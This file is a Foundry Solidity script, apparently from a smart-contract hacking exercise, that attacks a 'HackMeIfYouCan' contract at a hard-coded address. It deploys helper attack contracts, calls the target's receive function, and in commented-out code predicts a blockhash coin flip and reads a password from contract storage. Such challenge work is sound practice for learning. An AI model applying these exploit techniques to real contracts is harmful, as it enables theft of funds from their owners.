// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import {Script, console} from "forge-std/Script.sol";
import {HackMeIfYouCan} from "../src/HackMeIfYouCan.sol";
import {deployHackMe} from "./deployHackMe.s.sol"; 
import {AttackGoto} from "../src/AttackGoto.sol";
import {AttackAddPoint} from "./attackAddPoint.s.sol";

contract attackHackMe is Script {
    HackMeIfYouCan public hackMeContract;
    AttackGoto public attackGoto;
    AttackAddPoint public attackAddPoint;

    function setUp() public {}

    function run() public {
        //deployHackMe deployScript = new deployHackMe();
        address payable hackMeAddress = payable(0x9D29D33d4329640e96cC259E141838EB3EB2f1d9);
        //hackMeContract = deployScript.run();
        //address payable hackMeAddress = payable(0x9D29D33d4329640e96cC259E141838EB3EB2f1d9);
        hackMeContract = HackMeIfYouCan(hackMeAddress);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        hackMeContract.contribute{value: 0.0001 ether}();
        console.log("Contribution ok");

        //Plusieurs appels pour obtenir 10 victoires consécutives
        // uint256 consecutiveWins = hackMeContract.getConsecutiveWins(0x3b8874ea1c07f503Dd20cD21E3945CEeCF18D755);
        // while (consecutiveWins < 10) {
        //     uint256 blockValue = uint256(blockhash(block.number - 1));
        //     uint256 coinFlip = blockValue / hackMeContract.FACTOR();
        //     bool side = coinFlip == 1 ? true : false;

        //     try hackMeContract.flip(side) {
        //         consecutiveWins = hackMeContract.getConsecutiveWins(0x3b8874ea1c07f503Dd20cD21E3945CEeCF18D755);
        //         console.log("gg : ", consecutiveWins);
        //     } catch {
        //         console.log("pas gg");
        //     }

        //     // Avancer d'un bloc
        //     vm.roll(block.number + 1);
        // }

        console.log("10 consecutive wins achieved!");

         // Déployer le contrat AttackGoto
        attackGoto = new AttackGoto(hackMeAddress);
        console.log("AttackGoto deployed at:", address(attackGoto));

        // Effectuer l'attaque en utilisant goTo
        uint256 floor = 1;
        attackGoto.attack(floor);
        console.log("Attack with goTo executed");
       
          // Lire les valeurs de stockage proches pour identifier le mot de passe correct
        // for (uint256 i = 0; i < 10; i++) {
        //     bytes32 slot = bytes32(i);
        //     bytes32 value = vm.load(hackMeAddress, slot);
        //     console.log("Slot");
        //     console.logUint(i);
        //     console.logBytes32(value);
        // }

        // // Tentative d'utilisation du mot de passe lu
        // bytes32 password = vm.load(hackMeAddress, bytes32(uint256(1)));
        // console.logBytes32(password);

        // // Attaque en utilisant sendPassword
        // try hackMeContract.sendPassword(password) {
        //     console.log("sendPassword executed successfully");
        // } catch Error(string memory reason) {
        //     console.log("sendPassword failed with reason:", reason);
        // } catch (bytes memory lowLevelData) {
        //     console.log("sendPassword failed with low level data:");
        //     console.logBytes(lowLevelData);
        // }

         // Attaque en utilisant receive
        (bool success, ) = hackMeAddress.call{value: 0.0001 ether}("");
        require(success, "fail");
        console.log("recieve ok ");

         // Déployer le contrat AttackAddPoint
        attackAddPoint = new AttackAddPoint(hackMeAddress);
        console.log("AttackAddPoint deployed at:", address(attackAddPoint));

        // Appeler la fonction addPoint via le contrat AttackAddPoint
        attackAddPoint.attack();
        console.log("Attack with addPoint executed");


        vm.stopBroadcast();
    }

     receive() external payable {}
}
